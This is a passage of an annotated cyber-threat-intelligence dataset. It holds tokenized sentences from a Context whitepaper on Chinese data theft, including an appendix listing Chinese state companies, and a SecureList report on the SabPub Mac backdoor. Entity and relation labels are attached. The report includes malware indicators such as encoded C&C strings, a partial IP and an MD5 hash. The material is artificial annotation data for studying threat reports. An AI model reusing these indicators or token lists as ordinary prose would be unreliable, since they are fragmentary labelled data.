"benefit", "of", "companies", "and", "the", "government", ",", "the", "greater", "the", "incentive", "to", "continue", "with", "these", "operations", "."], ["Governments", "and", "large", "companies", "do", "not", "appear", "to", "be", "making", "much", "headway", "in", "solving", "this", "problem", "."], ["For", "large", "corporations", "in", "the", "West", ",", "where", "there", "is", "a", "tendency", "to", "focus", "more", "on", "the", "short", "term", "and", "on", "personal", "achievement", "rather", "than", "the", "long", "term", "advancement", "of", "the", "state", ",", "the", "potential", "riches", "which", "trade", "with", "China", "offers", "are", "so", "large", "that", "turning", "a", "blind", "eye", "to", "data", "theft", "may", "seem", "a", "reasonable", "price", "to", "pay", "."], ["Governments", "dare", "not", "risk", "isolation", "from", "China", "for", "economic", "and", "political", "reasons", "."], ["Norway", "has", "recently", "been", "shut", "out", "of", "Chinese", "relations", "after", "awarding", "the", "Nobel", "Peace", "Prize", "to", "a", "jailed", "Chinese", "dissident", "Liu", "Xiaobo20", "."], ["Its", "trade", "links", "with", "China", "are", "minimal", ",", "so", "it", "can", "afford", "to", "do", "this", ",", "but", "few", "other", "countries", "would", "feel", "able", "to", "do", "the", "same", "."], ["A", "combination", "of", "this", "reluctance", "to", "act", ",", "chronic", "under", "-", "investment", "in", "IT", "and", "a", "lack", "of", "user", "education", "about", "how", "to", "spot", "the", "warning", "signs", "of", "a", "potential", "attack", "means", "companies", "and", "organisations", "are", "extremely", "vulnerable", "."], ["In", "order", "to", "start", "rectifying", "the", "problem", "there", "is", "a", "need", "in", "the", "first", "instance", "to", "understand", "the", "problem", "."], ["There", "needs", "to", "be", "an", "acceptance", "that", "this", "problem", "is", "not", "going", "to", "go", "away", ",", "that", "this", "is", "a", "business", "risk", "not", "at", "IT", "issue", "."], ["Doing", "business", "with", "China", "carries", "extra", "risk", "in", "terms", "of", "data", "security", "and", "traditional", "security", "products", "are", "unable", "to", "defend", "your", "data", "against", "this", "type", "of", "attack", "."], ["Investigation", "of", "compromises", "needs", "to", "be", "thorough", "and", "conducted", "by", "people", "familiar", "with", "this", "problem", "and", "not", "simply", "the", "technical", "aspects", "of", "it", "."], ["Above", "all", "sensitive", "data", "must", "be", "segregated", "\u2013", "it", "is", "not", "possible", "to", "defend", "everything", "."], ["The", "reason", "targeted", "attacks", "pose", "such", "a", "dangerous", "threat", "is", "that", "these", "are", "not", "viruses", "which", "simply", "spread", "and", "act", "according", "to", "a", "set", "of", "defined", "rules", "in", "the", "software", "."], ["There", "are", "human", "beings", "directing", "these", "attacks", "in", "a", "much", "more", "active", "way", "."], ["They", "have", "been", "given", "specific", "duties", "and", "will", "not", "stop", "what", "they", "are", "doing", "until", "someone", "tells", "them", "to", "do", "so", "."], ["If", "your", "data", "is", "of", "interest", "today", ",", "it", "will", "still", "be", "of", "interest", "tomorrow", "."], ["If", "you", "have", "been", "attacked", "once", "and", "somehow", "managed", "to", "stop", "it", ",", "you", "have", "only", "stopped", "one", "instance", "of", "the", "attack", ",", "not", "the", "attack", "as", "a", "whole", "."], ["The", "malware", "used", "simply", "provides", "a", "foothold", "in", "the", "network", ",", "an", "initial", "point", "of", "access", "through", "which", "other", "tools", "can", "be", "uploaded", "to", "allow", "attackers", "access", "over", "the", "longer", "term", ",", "to", "navigate", "through", "the", "network", "until", "they", "find", "the", "data", "of", "interest", "to", "them", "."], ["If", "one", "technique", "does", "n\u2019t", "work", ",", "they", "will", "adapt", "their", "methods", "and", "raise", "their", "game", "until", "they", "have", "success", "."], ["It", "may", "be", "that", "one", "day", "western", "governments", "will", "decide", "that", "\u2018", "if", "you", "ca", "n\u2019t", "beat", "them", ",", "join", "them", "\u2019", "and", "develop", "similar", "capabilities", "to", "be", "used", "against", "foreign", "governments", "and"], ["20", "http://www.bbc.co.uk/news/world-asia-pacific-11505164", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "21", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "companies", "."], ["We", "can", "only", "speculate", "as", "to", "how", "China", "might", "react", "to", "the", "large", "-", "scale", "targeting", "of", "its", "own", "companies", "and", "institutions", "."], ["As", "for", "now", ",", "we", "have", "limited", "evidence", "of", "large", "companies", "failing", "as", "a", "direct", "result", "of", "the", "attacks", ",", "though", "there", "seems", "to", "be", "consensus", "that", "Chinese", "intrusions", "at", "least", "contributed", "to", "the", "downfall", "of", "one", "time", "telecoms", "giant", "Nortel21", "."], ["We", "do", "not", "yet", "know", "how", "many", "others", "may", "follow", "."], ["http://www.cbc.ca/news/world/story/2012/02/15/nortel-hacking-shields-as-ithappens.html", "21", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "22", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "About", "Context", "Context", "Information", "Security", "is", "an", "independent", "security", "consultancy", "specialising", "in", "both", "technical", "security", "and", "information", "assurance", "services", "."], ["The", "company", "was", "founded", "in", "1998", "."], ["Its", "client", "base", "has", "grown", "steadily", "over", "the", "years", ",", "thanks", "in", "large", "part", "to", "personal", "recommendations", "from", "existing", "clients", "who", "value", "us", "as", "business", "partners", "."], ["We", "believe", "our", "success", "is", "based", "on", "the", "value", "our", "clients", "place", "on", "our", "productagnostic", ",", "holistic", "approach", ";", "the", "way", "we", "work", "closely", "with", "them", "to", "develop", "a", "tailored", "service", ";", "and", "to", "the", "independence", ",", "integrity", "and", "technical", "skills", "of", "our", "consultants", "."], ["Context", "are", "ideally", "placed", "to", "work", "with", "clients", "worldwide", "with", "offices", "in", "the", "UK", ",", "Australia", "and", "Germany", "."], ["The", "company", "\u2019s", "client", "base", "now", "includes", "some", "of", "the", "most", "prestigious", "blue", "chip", "companies", "in", "the", "world", ",", "as", "well", "as", "government", "organisations", "."], ["The", "best", "security", "experts", "need", "to", "bring", "a", "broad", "portfolio", "of", "skills", "to", "the", "job", ",", "so", "Context", "has", "always", "sought", "to", "recruit", "staff", "with", "extensive", "business", "experience", "as", "well", "as", "technical", "expertise", "."], ["Our", "aim", "is", "to", "provide", "effective", "and", "practical", "solutions", ",", "advice", "and", "support", ":", "when", "we", "report", "back", "to", "clients", "we", "always", "communicate", "our", "findings", "and", "recommendations", "in", "plain", "terms", "at", "a", "business", "level", "as", "well", "as", "in", "the", "form", "of", "an", "in", "-", "depth", "technical", "report", "."], ["Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ","], ["E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "23", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Appendix"], ["No", "."], ["Company", "Name", "Website", "1", "China", "National", "Nuclear", "Corporation", "http://www.cnnc.com.cn", "2", "China", "Nuclear", "Engineering", "Group", "Corporation", "http://www.cnecc.com", "3", "China", "Aerospace"], ["Science", "and", "Technology", "Corporation", "http://www.spacechina.com", "4", "China", "Aerospace"], ["Science", "and", "Industry", "Corporation", "http://www.casic.com.cn", "5", "Aviation", "Industry", "Corporation", "of"], ["China", "http://www.avic.com.cn", "6", "China", "State", "Shipbuilding", "Corporation", "http://www.cssc.net.cn", "7"], ["China", "Shipbuilding"], ["Industry", "Corporation", "http://www.csic.com.cn", "8", "China", "North", "Industries", "Group", "Corporation", "http://www.norincogroup.com.cn", "9"], ["China", "South", "Industries", "Group", "Corporation", "http://www.csgc.com.cn", "10", "China", "Electronics", "Technology", "Group", "Corporation", "http://www.cetc.com.cn", "11", "China", "National", "Petroleum", "Corporation", "http://www.cnpc.com.cn/cn", "12", "China", "Petrochemical", "Corporation", "http://www.sinopecgroup.c", "om", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "24", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", ".", "Company", "Name", "Website", "13", "China", "National", "Offshore", "Oil", "Corporation", "http://www.cnooc.com.cn", "14", "State", "Grid", "Corporation", "of"], ["China", "http://www.sgcc.com.cn", "15", "China", "Southern", "Power", "Grid", "Co.", ",", "Ltd.", "http://www.csg.cn", "16"], ["China", "Huaneng", "Group", "http://www.chng.com.cn", "17"], ["China", "Datang", "Corporation", "http://www.china-cdt.com", "18", "China", "Huadian", "Corporation", "http://www.chd.com.cn", "19", "China", "Guodian", "Corporation", "http://www.cgdc.com.cn", "20", "China", "Power", "Investment", "Corporation", "http://www.cpicorp.com.cn", "21", "China", "Three", "Gorges", "Corporation", "http://www.ctgpc.com.cn/", "22", "Shenhua", "Group", "Corporation", "Limited", "http://www.shenhuagroup.com.cn", "23", "China"], ["Telecommunication", "s", "Corporation", "http://www.chinatelecom.com.cn", "24", "China", "United", "Network", "Communications", "Group", "Co.", ",", "Ltd.", "http://www.chinaunicom.com.cn", "25", "China", "Mobile", "Communications", "Corporation", "http://www.10086.cn", "26", "China", "Electronics", "Corporation", "http://www.cec.com.cn", "27"], ["China", "FAW", "Group", "Corporation", "http://www.faw.com.cn", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "25", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "No", "."], ["Company", "Name", "Website", "28", "Dongfeng", "Motor", "Corporation", "http://www.dfmc.com.cn", "29"], ["China", "First", "Heavy", "Industries", "http://www.cfhi.com", "30", "China", "National", "Erzhong", "Group", "Co.", "http://www.chinaerzhong.com", "31", "Harbin", "Electric", "Corporation", "http://www.hpec.com", "32", "Dongfang", "Electric", "Corporation", "http://www.dongfang.com", "33", "Anshan", "Iron", "and", "Steel", "Group", "Corporation", "http://www.ansteelgroup.com", "34", "Baosteel", "Group", "Corporation", "http://www.baosteel.com", "35", "Wuhan", "Iron", "and", "Steel", "(", "Group", ")"], ["Corporation", "http://www.wisco.com.cn", "36", "Aluminum", "Corporation", "of"], ["China", "http://www.chalco.com.cn", "37", "China", "Ocean", "Shipping", "(", "Group", ")"], ["Company", "http://www.cosco.com", "38", "China", "Shipping"], ["(", "Group", ")", "Company", "http://www.cnshipping.com", "39"], ["China", "National", "Aviation", "Holding", "Company", "http://www.airchinagroup.com", "40"], ["China", "Eastern", "Air", "Holding", "Company", "http://www.ceair.com", "41", "China", "Southern", "Air", "Holding", "Company", "http://www.csair.cn", "42", "Sinochem", "Group", "http://www.sinochem.com", "43", "COFCO", "Limited", "http://www.cofco.com", "44", "China", "Minmetals", "Corporation", "http://www.minmetals.com.cn", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "26", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "No", "."], ["Company", "Name", "Website", "45"], ["China", "General", "Technology", "(", "Group", ")", "Holding", ","], ["Limited", "http://www.genertec.com.cn", "46", "China", "State", "Construction", "Engineering", "Corporation", "http://www.cscec.com", "47"], ["China", "Grain"], ["Reserves", "Corporation", "http://www.sinograin.com.cn", "48", "State", "Development", "&", "Investment", "Corp.", "http://www.sdic.com.cn", "49"], ["China", "Merchants", "Group", "http://www.cmhk.com", "50", "China", "Resources", "http://www.crc.com.hk", "51", "China", "National", "Travel", "Service", "(", "HK", ")"], ["Group", "Corporation"], ["[", "China", "Travel", "Service", "(", "Holdings", ")"], ["Hong", "Kong", "Limited", "]", "http://www.hkcts.com", "52", "State", "Nuclear", "Power", "Technology", "Corporation", "Ltd.", "http://www.snptc.com.cn", "53", "Commercial", "Aircraft", "Corporation", "of", "China", ",", "Ltd.", "http://www.comac.cc", "54"], ["China", "Energy"], ["Conservation", "and", "Environmental", "Protection", "Group", "http://www.cecic.com.cn", "55", "China", "International", "Engineering", "Consulting", "Corporation", "http://www.ciecc.com.cn", "56", "China", "Huafu", "Trade", "&", "Development", "Group", "Corp.", "http://www.hfjt.com.cn", "57", "China", "Chengtong", "Holdings", "Group", "Ltd.", "http://www.cctgroup.com.cn", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207"], ["537", "7515", "www.contextis.com", "27", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "No", "."], ["Company", "Name", "Website", "58", "China", "National", "Coal", "Group", "Corp."], ["http://www.chinacoal.com", "59", "China", "Coal", "Technology", "&", "Engineering", "Group", "Corp.", "http://www.ccteg.cn", "60", "China", "National", "Machinery", "Industry", "Corporation", "http://www.sinomach.com.cn", "61", "China", "Academy", "of", "Machinery", "Science", "&", "Technology", "http://www.cam.com.cn", "62", "Sinosteel", "Corporation", "http://www.sinosteel.com", "63", "China", "Metallurgical", "Group", "Corporation", "http://www.mcc.com.cn", "64", "China", "Iron", "&", "Steel", "Research", "Institute", "Group", "http://www.cisri.com.cn", "65", "China", "National", "Chemical", "Corporation", "http://www.chemchina.com", "66", "China", "National", "Chemical", "Engineering", "Group", "Corporation", "http://www.cncec.cn", "67"], ["Sinolight", "Corporation", "http://www.sinolight.cn", "68", "China", "National", "Arts", "&", "Crafts", "(", "Group", ")"], ["Corporation", "http://www.cnacgc.com", "69", "China", "National", "Salt", "Industry", "Corporation", "http://www.chinasalt.com.cn", "70"], ["Huacheng", "Investment", "&", "Management", "Co.", ",", "Ltd."], ["Unknown", "71", "China", "Hengtian", "Group", "Co.", ",", "Ltd.", "http://www.chtgc.com"], ["Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "28", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "No", "."], ["Company", "Name", "Website", "72"], ["China", "National", "Materials", "Group", "Corporation", "Ltd.", "http://www.sinoma.cn", "73", "China", "National", "Building", "Materials", "Group", "Corporation", "http://www.cnbm.com.cn", "74", "China", "Nonferrous", "Metal", "Mining", "(", "Group", ")", "Co.", ",", "Ltd.", "http://www.cnmc.com.cn", "75", "General", "Research", "Institute", "for", "Nonferrous", "Metals", "http://www.grinm.com", "76", "Beijing", "General", "Research", "Institute", "of", "Mining", "&", "Metallurgy", "http://www.bgrimm.com", "77"], ["China", "International", "Intellectech", "Corporation", "http://www.ciic.com.cn", "78", "China", "Academy", "of", "Building", "Research", "http://www.cabr.com.cn", "79", "China", "North"], ["Locomotive", "and", "Rolling", "Stock"], ["Industry"], ["(", "Group", ")"], ["Corporation", "http://www.chinacnr.com", "80", "China", "South", "Locomotive", "&"], ["Rolling", "Stock", "Corporation", "Limited", "http://www.csrgc.com.cn", "81", "China", "Railway", "Signal", "&", "Communication", "Corporation", "http://www.crsc.cn", "82", "China", "Railway", "Group", "Limited", "http://www.crecg.com", "83", "China", "Railway", "Construction", "Corporation", "Limited", "http://www.crcc.cn", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "29", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "No", "."], ["Company", "Name", "Website", "84", "China", "Communications", "Construction", "Company", "Limited", "http://www.ccgrp.com.cn", "85", "Potevio", "Company"], ["Limited", "http://www.potevio.com", "86", "China", "Academy", "of", "Telecommunication", "and", "Technology", "http://www.datanggroup.cn", "87", "China", "National", "Agricultural", "Development", "Group", "Co.", ",", "Ltd.", "http://www.cnadc.com.cn", "88", "Chinatex", "Corporation", "http://www.chinatex.com", "89", "Sinotrans", "&", "CSC", "Holdings", "Co.", ",", "Ltd.", "http://www.sinotrans-csc.com", "90", "China", "National", "Silk", "Import", "&", "Export", "Corporation", "http://www.chinasilk.com", "91", "China", "Forestry", "Group", "Corporation", "http://www.cfgc.cn", "92", "China", "National", "Pharmaceutical", "Group", "Corporation", "http://www.sinopharm.com", "93", "CITS", "Group", "Corporation", "http://www.citsgroup.com.cn", "94", "China", "Poly", "Group", "Corporation", "http://www.citsgroup.com.cn", "95"], ["Zhuhai", "ZhenRong", "Company", "http://www.zhzrgs.com.cn", "96"], ["China", "Architecture", "Design", "&", "Research", "Group", "http://www.cadreg.com.cn", "97", "China", "Metallurgical", "Geology", "Bureau", "http://www.cmgb.com.cn", "98", "China", "National", "Administration", "of", "Coal", "Geology", "http://www.ccgc.cn", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "30", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", ".", "Company", "Name", "Website", "99", "Xinxing", "Cathay", "International", "Group", "Co.", ",", "Ltd.", "http://www.xxcig.com", "100"], ["China", "Travelsky"], ["Holding", "Company", "http://www.travelskyholding", "s.com", "101", "China", "National", "Aviation", "Fuel", "Group", "Corporation", "http://www.cnaf.com", "102", "China", "Aviation", "Supplies", "Holding", "Company", "http://www.casc.com.cn", "103", "Power", "Construction", "Corporation", "of"], ["China", "http://www.zhongguodianjian.com", "104", "China", "Energy", "Engineering", "Group", "Co.", ",", "Ltd", "http://www.ceec.net.cn", "105", "China", "National", "Gold", "Group", "Corporation", "http://www.chinagoldgroup.com", "106", "China", "National", "Cotton", "Reserves", "Corporation", "http://www.cncrc.com.cn", "107", "China"], ["Printing", "(", "Group", ")"], ["Corporation", "http://www.cpgc.cn", "108", "China", "Guangdong", "Nuclear", "Power", "Holding", "Corporation", "Ltd.", "http://www.cgnpc.com.cn", "109", "China", "Hualu", "Group", "Co.", ",", "Ltd.", "http://www.hualu.com.cn", "110"], ["Alcatel", "-", "Lucent"], ["Shanghai", "Bell", "Co.", ",", "Ltd."], ["http://www.alcatelsbell.com.cn", "111", "IRICO", "Group", "Corporation", "http://www.ch.com.cn", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "31", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "No", "."], ["Company", "Name", "Website", "112", "Wuhan", "Research", "Institute", "of", "Post", "and", "Telecommunication", "s", "http://www.wri.com.cn", "113", "OCT", "Group", "http://www.chinaoct.com", "114", "Nam", "Kwong"], ["(", "Group", ")", "Company"], ["Limited", "http://www.namkwong.com", ".mo"], ["115", "China", "XD", "Group", "http://www.xd.com.cn", "116"], ["China", "Railway", "Materials", "Commercial", "Corp.", "http://www.crmsc.com.cn", "117", "China", "Reform", "Holdings", "Corporation", "Ltd.", "http://www.crhc.cn/n127514"], ["92", "/", "index.html", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ","], ["E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "32", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Context", "Information", "Security", "Ltd", "London", "(", "HQ", ")", "Cheltenham", "D\u00fcsseldorf", "Melbourne", "4th", "Floor", "Corinth", "House", "Adersstr", "."], ["28", ",", "1.OG", "Level", "9", ",", "440", "Collins", "St", "30", "Marsh", "Wall", "117", "Bath", "Road", "D-40215", "D\u00fcsseldorf", "Melbourne", "London", "E14", "9TP", "Cheltenham", "GL53", "7LS", "Germany", "Victoria", "3000", "United", "Kingdom", "United", "Kingdom", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "Australia", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "33", "/", "33"]]}, {"vertexSet": [[{"name": "LuckyCat", "pos": [24, 25], "sent_id": 1, "type": "Attacker"}], [{"name": "199.192.152.*", "pos": [12, 15], "sent_id": 2, "type": "Address"}], [{"name": "Friday Apri 13", "pos": [1, 4], "sent_id": 5, "type": "Time"}], [{"name": "SabPub", "pos": [4, 5], "sent_id": 13, "type": "Malware"}], [{"name": "SabPub", "pos": [2, 3], "sent_id": 16, "type": "Malware"}], [{"name": "e3SCNUA2Om97ZXJ1fGI+Y4Bt", "pos": [33, 34], "sent_id": 17, "type": "Indicator"}], [{"name": "OjlDLjw5Pi4+NUAuQDBA", "pos": [51, 52], "sent_id": 17, "type": "Indicator"}], [{"name": "Exploit.MSWord.CVE-2009-0563.a", "pos": [22, 29], "sent_id": 21, "type": "Dropper"}], [{"name": "MaControl", "pos": [16, 17], "sent_id": 22, "type": "Malware"}], [{"name": "SabPub", "pos": [4, 5], "sent_id": 23, "type": "Malware"}], [{"name": "8958.doc", "pos": [9, 10], "sent_id": 25, "type": "File"}], [{"name": "40C8786A4887A763D8F3E5243724D1C9", "pos": [1, 2], "sent_id": 28, "type": "MD5"}], [{"name": "10th March Statemnet", "pos": [10, 13], "sent_id": 31, "type": "File"}], [{"name": "VirusTotal", "pos": [28, 29], "sent_id": 31, "type": "Software"}], [{"name": "spearphishing emails", "pos": [19, 21], "sent_id": 39, "type": "Exploit"}], [{"name": "Java exploits", "pos": [14, 16], "sent_id": 42, "type": "Exploit"}], [{"name": "Mac OS X", "pos": [19, 22], "sent_id": 42, "type": "ExploitTargetObject"}], [{"name": "SabPub", "pos": [10, 11], "sent_id": 45, "type": "Attacker"}], [{"name": "February 2012", "pos": [14, 16], "sent_id": 47, "type": "Time"}], [{"name": "Word", "pos": [6, 7], "sent_id": 49, "type": "Software"}], [{"name": "CVE-2009-0563", "pos": [11, 14], "sent_id": 49, "type": "Vulnerability"}]], "labels": [{"r": "P33", "h": 0, "t": 2, "evidence": [1, 5]}, {"r": "P21", "h": 5, "t": 4, "evidence": [16, 17]}, {"r": "P21", "h": 6, "t": 4, "evidence": [16, 17]}, {"r": "P21", "h": 10, "t": 9, "evidence": [23, 25]}, {"r": "P21", "h": 11, "t": 9, "evidence": [23, 28]}, {"r": "P33", "h": 17, "t": 18, "evidence": [45, 47]}, {"r": "P19", "h": 19, "t": 20, "evidence": [49]}], "title": "201204SecureListSabPub", "sents": [["New", "Version", "of", "OSX.SabPub", "&", "Confirmed", "Mac", "APT", "attacks"], ["Late", "last", "week", ",", "we", "found", "evidence", "of", "a", "possible", "link", "between", "a", "Mac", "OS", "X", "backdoor", "trojan", "and", "an", "APT", "attack", "known", "as", "LuckyCat", "."], ["The", "IP", "address", "of", "the", "C&C", "to", "which", "this", "bot", "connects", "(", "199.192.152", ".", "*", ")", "was", "also", "used", "in", "other", "Windows", "malware", "samples", "during", "2011", ",", "which", "made", "us", "believe", "we", "were", "looking", "at", "the", "same", "entity", "behind", "these", "attacks", "."], ["For", "the", "past", "two", "days", ",", "we", "have", "been", "monitoring", "a", "\u201c", "fake", "\u201d", "infected", "system", "-", "which", "is", "a", "typical", "procedure", "we", "do", "for", "APT", "bots", "."], ["We", "were", "extremely", "surprised", "when", "during", "the", "weekend", ",", "the", "APT", "controllers", "took", "over", "our", "\u201c", "goat", "\u201d", "infected", "machine", "and", "started", "exploring", "it", "."], ["On", "Friday", "Apri", "13", ",", "port", "80", "on", "the", "C&C", "server", "located", "at", "rt*****.onedumb.com", "and", "hosted", "on", "a", "VPS", "in", "Fremont", ",", "U.S.", "was", "closed", "."], ["Saturday", ",", "the", "port", "was", "opened", "and", "bot", "started", "communicating", "with", "the", "C&C", "server", "."], ["For", "the", "entire", "day", ",", "the", "traffic", "was", "just", "basic", "handshakes", "and", "exchanges", ",", "nothing", "more", "."], ["On", "the", "morning", "of", "Sunday", "April", "15", ",", "the", "traffic", "generated", "by", "the", "C&C", "changed", "."], ["The", "attackers", "took", "over", "the", "connection", "and", "started", "analysing", "our", "fake", "victim", "machine", "."], ["They", "listed", "the", "contents", "of", "the", "root", "and", "home", "folders", "and", "even", "stole", "some", "of", "the", "goat", "documents", "we", "put", "in", "there", "!"], ["Encoded", "communication", "between", "C&C", "and", "our", "fake", "victim", "Packet", "above", ",", "decoded", "-", "attacker", "is", "listing", "folders", "content"], ["We", "are", "pretty", "confident", "the", "operation", "of", "the", "bot", "was", "done", "manually", "--", "which", "means", "a", "real", "attacker", ",", "who", "manually", "checks", "the", "infected", "machines", "and", "extracts", "data", "from", "them", "."], ["We", "can", "therefore", "confirm", "SabPub", "as", "APT", "in", "active", "stage", "."], ["On", "Sunday", "midday", ",", "the", "C&C", "domain", "was", "shutdown", "and", "the", "bot", "lost", "connection", "to", "it", ";", "this", "appears", "to", "be", "an", "initiative", "from", "the", "free", "DNS", "service", "onedumb.com", "and", "it", "was", "no", "doubt", "triggered", "by", "the", "media", "attention", "."], ["Interestingly", ",", "the", "VPS", "used", "as", "the", "C&C", "is", "still", "active", "."], ["While", "analysing", "SabPub", ",", "we", "discovered", "another", "version", "of", "the", "backdoor", "which", "seems", "to", "have", "been", "created", "earlier", "."], ["This", "version", "differs", "from", "the", "original", "one", "only", "slightly", "--", "the", "hardcoded", "C&C", "address", "is", "different", "-instead", "of", "the", "onedumb.com", "subdomain", "used", "by", "the", "original", "sample", "(", "hardcoded", "in", "the", "bot", "as", "\u201c", "e3SCNUA2Om97ZXJ1fGI+Y4Bt", "\u201d", ")", ",", "this", "one", "simply", "contains", "the", "IP", "address", "of", "the", "VPS", "(", "hardcoded", "as", "\u201c", "OjlDLjw5Pi4+NUAuQDBA", "\u201d", ")", ",", "meaning", ",", "it", "should", "still", "be", "operational", "."], ["Its", "size", "is", "42556", "bytes", "vs", "42580", "for", "the", "original", "one", "."], ["One", "of", "the", "biggest", "mysteries", "is", "the", "infection", "vector", "of", "these", "attacks", "."], ["Given", "the", "highly", "targeted", "nature", "of", "the", "attack", ",", "there", "are", "very", "few", "traces", "."], ["Nevertheless", ",", "we", "found", "an", "important", "detail", "which", "is", "the", "missing", "link", ":", "Six", "Microsoft", "Word", "documents", ",", "which", "we", "detect", "as", "Exploit", ".", "MSWord", ".", "CVE-2009", "-", "0563.a", "."], ["In", "total", "we", "have", "six", "relevant", "Word", ".docs", "with", "this", "verdict", "--", "with", "four", "dropping", "the", "MaControl", "bot", "."], ["The", "remaining", "two", "drop", "SabPub", "."], ["The", "most", "interesting", "thing", "here", "is", "the", "history", "of", "the", "second", "SabPub", "variant", "."], ["In", "our", "virus", "collection", ",", "it", "is", "named", "\u201c", "8958.doc", "\u201d", "."], ["This", "suggests", "iit", "was", "extracted", "from", "a", "Word", "document", "or", "was", "distributed", "as", "a", "Doc", "-", "file", "."], ["We", "performed", "an", "analysis", "of", "the", "same", "and", "traced", "its", "origin", "by", "the", "MD5"], ["(", "40C8786A4887A763D8F3E5243724D1C9", ")", "."], ["The", "results", "were", "fascinating", ":", "-"], ["The", "sample", "was", "uploaded", "to", "VirusTotal", "on", "February", "25", ",", "2012", "\u2013", "from", "two", "sources", "in", "the", "U.S.", "-"], ["In", "both", "cases", ",", "the", "original", "file", "name", "was", "\u201c", "10th", "March", "Statemnet", "\u201d", "(", "yes", ",", "with", "the", "typo", "and", "without", "extension", ")", "-", "Zero", "detections", "on", "VirusTotal", "at", "that", "time", "(", "0/40", ")"], ["In", "case", "you", "are", "wondering", ",", "the", "name", "of", "the", "file", "(", "\u201c", "10th", "March", "Statemnet", "\u201d", ")", "is", "directly", "linked", "with", "the", "DalaiLama", "and", "Tibetan", "community", "."], ["On", "March", "10", ",", "2011", ",", "the", "Dalai", "-", "Lama", "released", "a", "special", "statement", "related", "to", "Anniversary", "of", "the", "Tibetan", "People", "\u2019s", "National", "Uprising", "Day", "--", "hence", "the", "name", "."], ["Properties", "field", "of", "a", "document", "used", "to", "spread", "SabPub"], ["Unfortunately", "there", "is", "little", "information", "in", "the", "doc", "files", ",", "but", "the", "Author", "field", "and", "the", "creation", "date", "are", "interesting", "."], ["In", "particular", ",", "if", "we", "trust", "the", "creation", "date", ",", "this", "means", "the", "container", "DOC", "was", "created", "in", "August", "2010", "and", "it", "was", "updated", "in", "2012", "with", "the", "SabPub", "sample", "."], ["This", "is", "quite", "normal", "for", "such", "attacks", "and", "we", "have", "seen", "it", "in", "other", "cases", ",", "for", "instance", ",", "Duqu", "."], ["We", "think", "the", "above", "facts", "show", "a", "direct", "connection", "between", "the", "SabPub", "and", "Luckycat", "APT", "attacks", "."], ["We", "are", "pretty", "sure", "the", "SabPub", "backdoor", "was", "created", "as", "far", "back", "as", "February", "2012", "and", "was", "distributed", "via", "spearphishing", "emails", "."], ["It", "is", "also", "important", "to", "point", "that", "SabPub", "is", "n\u2019t", "backdoor", "MaControl", "(", "the", "case", "was", "described", "here", ")", "but", "still", "uses", "the", "same", "topics", "to", "trick", "victims", "into", "opening", "it", "."], ["SabPub", "was", "the", "more", "effective", "attack", "because", "it", "remained", "undetected", "for", "almost", "two", "months", "!"], ["The", "second", "variant", "of", "SabPub", "was", "created", "in", "March", "and", "the", "attackers", "are", "using", "Java", "exploits", "to", "infect", "target", "Mac", "OS", "X", "machines", "."], ["SabPub", "is", "still", "an", "active", "attack", "and", "we", "expect", "the", "attackers", "will", "release", "new", "variants", "of", "the", "bot", "with", "new"], ["C2s", "over", "the", "next", "days", "/", "weeks", "."], ["To", "summarize", ":", "-", "At", "least", "two", "variants", "of", "the", "SabPub", "bot", "exist", "today", "."], ["-"], ["The", "earliest", "version", "of", "the", "bot", "appears", "to", "have", "been", "created", "and", "used", "in", "February", "2012", "."], ["-"], ["The", "malware", "is", "being", "spread", "through", "Word", "documents", "that", "exploit", "the", 